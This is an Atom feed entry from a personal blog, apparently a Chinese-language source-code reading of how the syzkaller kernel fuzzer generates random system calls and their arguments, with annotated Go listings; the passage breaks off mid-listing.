<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://0x9k.club/"/>
  <updated>2018-05-14T11:13:57.000Z</updated>
  <id>https://0x9k.club/</id>
  
  <author>
    <name>0x9k</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>syzkaller_source_read_generate_system_calls</title>
    <link href="https://0x9k.club/posts/uncategorized/2018-05-14-syzkaller_source_read_generate_system_calls.html"/>
    <id>https://0x9k.club/posts/uncategorized/2018-05-14-syzkaller_source_read_generate_system_calls.html</id>
    <published>2018-05-14T11:13:57.000Z</published>
    <updated>2018-05-14T11:13:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="syzkaller源码阅读之生成系统调用"><a href="#syzkaller源码阅读之生成系统调用" class="headerlink" title="syzkaller源码阅读之生成系统调用"></a>syzkaller源码阅读之生成系统调用</h2><h3 id="生成系统调用的核心方法——Target类型中的Generate方法-prog-generation-go中定义"><a href="#生成系统调用的核心方法——Target类型中的Generate方法-prog-generation-go中定义" class="headerlink" title="生成系统调用的核心方法——Target类型中的Generate方法(prog/generation.go中定义)"></a>生成系统调用的核心方法——Target类型中的Generate方法(prog/generation.go中定义)</h3><p>前面说过Prog类型是个很重要的类型,它包含了目标体系结构Target类型和相关的系统调用切片数组,这里生成系统调用主要是通过随机类型生成一个新的Prog类型变量并返回.</p><p>Generate方法调用generateCall生成一个系统调用对应的参数等信息</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(target *Target)</span> <span class="title">Generate</span><span class="params">(rs rand.Source, ncalls <span class="keyword">int</span>, ct *ChoiceTable)</span> *<span class="title">Prog</span></span> &#123;</span><br><span class="line"><span class="comment">//建立一个Prog类型对象</span></span><br><span class="line">p := &amp;Prog&#123;</span><br><span class="line">Target: target,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化随机类型</span></span><br><span class="line">r := newRand(target, rs)</span><br><span class="line">s := newState(target, ct)</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(p.Calls) &lt; ncalls &#123;</span><br><span class="line"><span class="comment">//随机生成一个系统调用  参数类型和值(参数类型就比较多了具体看prog/rand.go中的generateArgImpl实现)</span></span><br><span class="line">calls := r.generateCall(s, p)</span><br><span class="line"><span class="keyword">for</span> _, c := <span class="keyword">range</span> calls &#123;</span><br><span class="line"><span class="comment">//分析系统调用对应的参数类型并进行相关的设置(如资源类型添加到对应的资源map中)</span></span><br><span class="line"><span class="comment">//具体实现在prog/analysis.go中(func (s *state) analyzeImpl(c *Call, resources bool))实现</span></span><br><span class="line">s.analyze(c)</span><br><span class="line"><span class="comment">//把生成的系统调用添加到prog中</span></span><br><span class="line">p.Calls = <span class="built_in">append</span>(p.Calls, c)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> debug &#123;</span><br><span class="line"><span class="keyword">if</span> err := p.validate(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机生成一个系统调用和该系统调用对应的参数-prog-rand-go中定义"><a href="#随机生成一个系统调用和该系统调用对应的参数-prog-rand-go中定义" class="headerlink" title="随机生成一个系统调用和该系统调用对应的参数(prog/rand.go中定义)"></a>随机生成一个系统调用和该系统调用对应的参数(prog/rand.go中定义)</h3><p>随机生成一个系统调用是通过随机类型实现:随机类型包含了一个Target类型的对象,通过自身的随机函数,可以生成Target中的系统调用切片数组元素即生成一个个的系统调用<br>随机生成一个系统调用的详细步骤:<br>1、随机生成一个系统调用号<br>2、生成该系统调用对应的参数<br>generateCall负责随机生成一个系统调用号,然后通过generateParticularCall生成一个具体的系统调用Call类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">generateCall</span><span class="params">(s *state, p *Prog)</span> []*<span class="title">Call</span></span> &#123;</span><br><span class="line">idx := <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> s.ct == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//随机生成一个系统调用号</span></span><br><span class="line">idx = r.Intn(<span class="built_in">len</span>(r.target.Syscalls))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">call := <span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p.Calls) != <span class="number">0</span> &#123;<span class="comment">//如果目标系统enabled的系统调用切片数组存在不为空</span></span><br><span class="line">call = p.Calls[r.Intn(<span class="built_in">len</span>(p.Calls))].Meta.ID<span class="comment">//随机获取一个系统调用号</span></span><br><span class="line">&#125;</span><br><span class="line">idx = s.ct.Choose(r.Rand, call)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//通过系统调用号生成一个系统调用 meta是生成的系统调用描述</span></span><br><span class="line">meta := r.target.Syscalls[idx]</span><br><span class="line"><span class="keyword">return</span> r.generateParticularCall(s, meta)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机生成系统调用Call类型-prog-rand-go中定义"><a href="#随机生成系统调用Call类型-prog-rand-go中定义" class="headerlink" title="随机生成系统调用Call类型(prog/rand.go中定义)"></a>随机生成系统调用Call类型(prog/rand.go中定义)</h3><p>generateParticularCall函数根据具体的系统调用描述(Syscall类型)生成相应的系统调用Call类型和具体的参数值,其中meta是随机生成的系统调用描述且该系统调用为enabled<br>通过generateArgs为该系统调用生成相关的参数值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">generateParticularCall</span><span class="params">(s *state, meta *Syscall)</span> <span class="params">(calls []*Call)</span></span> &#123;</span><br><span class="line"><span class="comment">//通过系统调用生成一个Call类型 Call类型是一个完整的系统调用包含参数和返回值</span></span><br><span class="line">c := &amp;Call&#123;</span><br><span class="line">Meta: meta,</span><br><span class="line">Ret:  MakeReturnArg(meta.Ret),<span class="comment">//生成返回值类型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//生成系统调用的参数</span></span><br><span class="line">c.Args, calls = r.generateArgs(s, meta.Args)</span><br><span class="line">r.target.assignSizesCall(c)</span><br><span class="line">calls = <span class="built_in">append</span>(calls, c)</span><br><span class="line"><span class="keyword">for</span> _, c1 := <span class="keyword">range</span> calls &#123;</span><br><span class="line">r.target.SanitizeCall(c1)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> calls</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为随机生成的系统调用生成相关的所有参数值-prog-rand-go中定义"><a href="#为随机生成的系统调用生成相关的所有参数值-prog-rand-go中定义" class="headerlink" title="为随机生成的系统调用生成相关的所有参数值(prog/rand.go中定义)"></a>为随机生成的系统调用生成相关的所有参数值(prog/rand.go中定义)</h3><p>为系统调用生成该系统调用的所有参数值,循环遍历系统调用参数类型切片数组,按参数类型生成具体的参数值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">generateArgs</span><span class="params">(s *state, types []Type)</span> <span class="params">([]Arg, []*Call)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> calls []*Call</span><br><span class="line"><span class="comment">//args定义参数类型的切片数组</span></span><br><span class="line">args := <span class="built_in">make</span>([]Arg, <span class="built_in">len</span>(types))</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate all args. Size args have the default value 0 for now.</span></span><br><span class="line"><span class="comment">//生成所有的参数类型 size默认大小是0</span></span><br><span class="line"><span class="comment">//遍历参数类型切片数组</span></span><br><span class="line"><span class="keyword">for</span> i, typ := <span class="keyword">range</span> types &#123;</span><br><span class="line"><span class="comment">//按第i个参数的类型生成参数的值</span></span><br><span class="line">arg, calls1 := r.generateArg(s, typ)</span><br><span class="line"><span class="keyword">if</span> arg == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(fmt.Sprintf(<span class="string">"generated arg is nil for type '%v', types: %+v"</span>, typ.Name(), types))</span><br><span class="line">&#125;</span><br><span class="line">args[i] = arg</span><br><span class="line">calls = <span class="built_in">append</span>(calls, calls1...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> args, calls</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为系统调用生成一个具体的参数值-prog-rand-go中定义"><a href="#为系统调用生成一个具体的参数值-prog-rand-go中定义" class="headerlink" title="为系统调用生成一个具体的参数值(prog/rand.go中定义)"></a>为系统调用生成一个具体的参数值(prog/rand.go中定义)</h3><p>通过传入参数的类型,为参数生成一个具体的值,其中参数types是系统调用的参数类型切片数组<br>其中有如下几种参数类型Const类型(包括IntType——int、FlagsType——标记、ConstType——常量、ProcType——处理器相关、VmaType——虚拟内存vma类型、ResourceType——资源类型)<br>指针类型(StructType——结构体指针、ArrayType——数组指针、UnionType——枚举联合类型的指针),其中指针设计多级指针的问题默认不超过3级指针超过设置为空指针<br>资源类型(ResourceType——资源类型)包含三种生成方式:已经存在的资源类型、创建一个新的资源类型、生成一个特殊的值<br>缓冲区类型(BufferType)包括:BufferBlobRand(随机的blog缓冲区)、BufferBlobRange(随机范围的blob缓冲区)、BufferString(字符串)、BufferFilename(文件名相关的缓冲区)、BufferText(文本相关的缓冲区)<br>虚拟内存类型(VmaType)创建一个虚拟内存<br>标记类型(FlagsType)内核中一些用来作flag标记的参数<br>常量类型(ConstType)<br>整型(IntType)<br>处理器相关的类型(ProcType)<br>数组类型(ArrayType)<br>结构体类型(StructType)<br>联合枚举类型(UnionType)<br>指针类型(PtrType)<br>长度类型(LenType)<br>自定义类型(CsumType)<br>其中针对不同的类型通过MakeXXXXArg生成参数对应类型的值,比如对于指针类型其生成值的函数为MakePointerArg,<br>结构体类型和数组类型通过MakeGroupArg生成,结构体类型看成是不同元素类型的数组<br>相关生成函数MakeXXXXArg在prog/rand.go中定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//按参数类型生成参数的值</span></span><br><span class="line"><span class="comment">//typ 参数类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">generateArg</span><span class="params">(s *state, typ Type)</span> <span class="params">(arg Arg, calls []*Call)</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> r.generateArgImpl(s, typ, <span class="literal">false</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//具体生成参数类型的实现函数</span></span><br><span class="line"><span class="comment">//参数类型可能是buffer、struct、union、指针等类型所以这里实现比较长</span></span><br><span class="line"><span class="comment">//typ参数类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *randGen)</span> <span class="title">generateArgImpl</span><span class="params">(s *state, typ Type, ignoreSpecial <span class="keyword">bool</span>)</span> <span class="params">(arg Arg, calls []*Call)</span></span> &#123;</span><br><span class="line"><span class="comment">//参数模式  输出参数</span></span><br><span class="line"><span class="keyword">if</span> typ.Dir() == DirOut &#123;</span><br><span class="line"><span class="comment">// No need to generate something interesting for output scalar arguments.</span></span><br><span class="line"><span class="comment">// But we still need to generate the argument itself so that it can be referenced</span></span><br><span class="line"><span class="comment">// in subsequent calls. For the same reason we do generate pointer/array/struct</span></span><br><span class="line"><span class="comment">// output arguments (their elements can be referenced in subsequent calls).</span></span><br><span class="line"><span class="keyword">switch</span> typ.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="comment">//判断参数的类型</span></span><br><span class="line"><span class="comment">//int flags const Proc类型 vma类型 Resource类型 生成一个默认的值</span></span><br><span class="line"><span class="keyword">case</span> *IntType, *FlagsType, *ConstType, *ProcType,</span><br><span class="line">*VmaType, *ResourceType:</span><br><span class="line"><span class="comment">//生成一个默认的值</span></span><br><span class="line"><span class="keyword">return</span> r.target.defaultArg(typ), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> typ.Optional() &amp;&amp; r.oneOf(<span class="number">5</span>) &#123;</span><br><span class="line"><span class="comment">//为typ类型成成一个默认值</span></span><br><span class="line"><span class="keyword">return</span> r.target.defaultArg(typ), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow infinite recursion for optional pointers.</span></span><br><span class="line"><span class="comment">//允许任意指针的无限递归</span></span><br><span class="line"><span class="comment">//如果是指针类型</span></span><br><span class="line"><span class="keyword">if</span> pt, ok := typ.(*PtrType); ok &amp;&amp; typ.Optional() &#123;</span><br><span class="line"><span class="keyword">switch</span> pt.Type.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="comment">//判断指针类型</span></span><br><span class="line"><span class="comment">//指针是指向结构体、数组、union联合类型</span></span><br><span class="line"><span class="keyword">case</span> *StructType, *ArrayType, *UnionType:</span><br><span class="line">name := pt.Type.Name()</span><br><span class="line">r.recDepth[name]++</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">r.recDepth[name]--</span><br><span class="line"><span class="keyword">if</span> r.recDepth[name] == <span class="number">0</span> &#123;</span><br><span class="line"><span class="built_in">delete</span>(r.recDepth, name)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">//如果指针层数太多 默认值为空指针</span></span><br><span class="line"><span class="keyword">if</span> r.recDepth[name] &gt;= <span class="number">3</span> &#123;</span><br><span class="line"><span class="comment">//为空指针生成一个默认值</span></span><br><span class="line"><span class="keyword">return</span> MakeNullPointerArg(typ), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断类型</span></span><br><span class="line"><span class="keyword">switch</span> a := typ.(<span class="keyword">type</span>) &#123;</span><br><span class="line"><span class="comment">//Resource类型</span></span><br><span class="line"><span class="keyword">case</span> *ResourceType:</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="comment">//概率</span></span><br><span class="line"><span class="keyword">case</span> r.nOutOf(<span class="number">1000</span>, <span class="number">1011</span>):</span><br><span class="line"><span class="comment">// Get an existing resource.</span></span><br><span class="line"><span class="comment">//已经存在的resource</span></span><br><span class="line"><span class="keyword">var</span> allres []Arg</span><br><span class="line"><span class="keyword">for</span> name1, res1 := <span class="keyword">range</span> s.resources &#123;</span><br><span class="line"><span class="keyword">if</span> name1 == <span class="string">"iocbptr"</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> r.target.isCompatibleResource(a.Desc.Name, name1) ||</span><br><span class="line">r.oneOf(<span class="number">20</span>) &amp;&amp; r.target.isCompatibleResource(a.Desc.Kind[<span class="number">0</span>], name1) &#123;</span><br><span class="line">allres = <span class="built_in">append</span>(allres, res1...)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(allres) != <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">//生成Resource类型的默认值</span></span><br><span class="line">arg = MakeResultArg(a, allres[r.Intn(<span class="built_in">len</span>(allres))], <span class="number">0</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">arg, calls = r.createResource(s, a)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//概率</span></span><br><span class="line"><span class="keyword">case</span> r.nOutOf(<span class="number">10</span>, <span class="number">11</span>):</span><br><span class="line"><span class="comment">// Create a new resource.</span></span><br><span class="line"><span class="comment">//创建一个新的资源</span></span><br><span class="line">arg, calls = r.createResource(s, a)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">//生成一个特殊的值为Resource类型</span></span><br><span class="line">special := a.SpecialValues()</span><br><span class="line">arg = MakeResultArg(a, <span class="literal">nil</span>, special[r.Intn(<span class="built_in">len</span>(special))])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> arg, calls</span><br><span class="line"><span class="keyword">case</span> *BufferType:</span><br><span class="line"><span class="comment">//buffer类型</span></span><br><span class="line"><span class="keyword">switch</span> a.Kind &#123;</span><br><span class="line"><span class="keyword">case</span> BufferBlobRand, BufferBlobRange:</span><br><span class="line"><span class="comment">//BufferBlobRand, BufferBlobRange类型的buffer</span></span><br><span class="line">sz := r.randBufLen()</span><br><span class="line"><span class="keyword">if</span> a.Kind == BufferBlobRange &#123;</span><br><span class="line">sz = r.randRange(a.RangeBegin, a.RangeEnd)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> a.Dir() == DirOut &#123;<span class="comment">//输出参数</span></span><br><span class="line"><span class="comment">//为buffer类型且为输出参数的类型生成默认值</span></span><br><span class="line"><span class="keyword">return</span> MakeOutDataArg(a, sz), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">data := <span class="built_in">make</span>([]<span class="keyword">byte</span>, sz)</span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> data &#123;</span><br><span class="line">data[i] = <span class="keyword">byte</span>(r.Intn(<span class="number">256</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//buffer类型非输出参数 生成默认的值</span></span><br><span class="line"><span class="keyword">return</span> MakeDataArg(a, data), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> BufferString:</span><br><span class="line"><span class="comment">//bufferstring类型的buffer</span></span><br><span class="line">data := r.randString(s, a)</span><br><span class="line"><span class="keyword">if</span> a.Dir() == DirOut &#123;<span class="comment">//输出参数</span></span><br><span class="line"><span class="comment">//为其生成默认值</span></span><br><span class="line"><span class="keyword">return</span> MakeOutDataArg(a, <span class="keyword">uint64</span>(<span class="built_in">len</span>(data))), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//非输出参数生成默认值</span></span><br><span class="line"><span class="keyword">return</span> MakeDataArg(a, data), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> BufferFilename:</span><br><span class="line"><span class="comment">//bufferfilename类型的buffer</span></span><br><span class="line"><span class="keyword">if</span> a.Dir() == DirOut &#123;</span><br><span class="line"><span class="comment">//输出参数</span></span><br><span class="line"><span class="keyword">var</span> sz <span class="keyword">uint64</span></span><br><span class="line"><span class="comment">//大小设置</span></span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> !a.Varlen():</span><br><span class="line">sz = a.Size()</span><br><span class="line"><span class="keyword">case</span> r.nOutOf(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">sz = r.rand(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">case</span> r.nOutOf(<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">sz = <span class="number">108</span> <span class="comment">// UNIX_PATH_MAX</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">sz = <span class="number">4096</span> <span class="comment">// PATH_MAX</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//为其生成参数类型</span></span><br><span class="line"><span class="keyword">return</span> MakeOutDataArg(a, sz), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//非输出参数设置默认值</span></span><br><span class="line"><span class="keyword">return</span> MakeDataArg(a, []<span class="keyword">byte</span>(r.filename(s, a))), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> BufferText:</span><br><span class="line"><span class="comment">//buffertext类型的buffer</span></span><br><span class="line"><span class="keyword">if</span> a.Dir() == DirOut &#123;</span><br><span class="line"><span class="comment">//输出参数</span></span><br><span class="line"><span class="keyword">return</span> MakeOutDataArg(a, <span class="keyword">uint64</span>(r.Intn(<span class="number">100</span>))), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//非输出参数</span></span><br><span class="line"><span class="keyword">return</span> MakeDataArg(a, r.generateText(a.Text)), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"unknown buffer kind"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> *VmaType:</span><br><span class="line"><span class="comment">//vma类型的参数</span></span><br><span class="line">npages := r.randPageCount()</span><br><span class="line"><span class="keyword">if</span> a.RangeBegin != <span class="number">0</span> || a.RangeEnd != <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">//获取vma范围 range范围</span></span><br><span class="line">npages = a.RangeBegin + <span class="keyword">uint64</span>(r.Intn(<span class="keyword">int</span>(a.RangeEnd-a.RangeBegin+<span class="number">1</span>)))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据vma范围分配一个vma</span></span><br><span class="line">arg := r.allocVMA(s, a, npages)</span><br><span class="line"><span class="keyword">return</span> arg, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> *FlagsType:</span><br><span class="line"><span class="comment">//flags类型的参数  就是内核中一些用来作flag标记的参数</span></span><br><span class="line"><span class="keyword">return</span> MakeConstArg(a, r.flags(a.Vals)), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> *ConstType:</span><br><span class="line"><span class="comment">//const类型的参数</span></span><br><span class="line"><span class="keyword">return</span> MakeConstArg(a, a.Val), <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> *IntType:</span><br><span class="line"><span class="comment">//int类型的参数</span></span><br><span class="line">v := r.randInt()</span><br><span class="line"><span class="keyword">switch</span> a.Kind &#123;</span><br><span class="line"><span class="keyword">case</span> IntFileoff:</span><br><span class="line"><span class="keyword">switch</span> &#123;</span><br><span class="line"><span class="keyword">case</span> r.nOutOf(<span class="number">90</span>, <span class="number">101</span>):</span><br><span class="line">v = <span class="number">0</span></span><br><span class="line"><span class="keyword">case</span> r.nOutOf(<span class="number">10</span>, <span 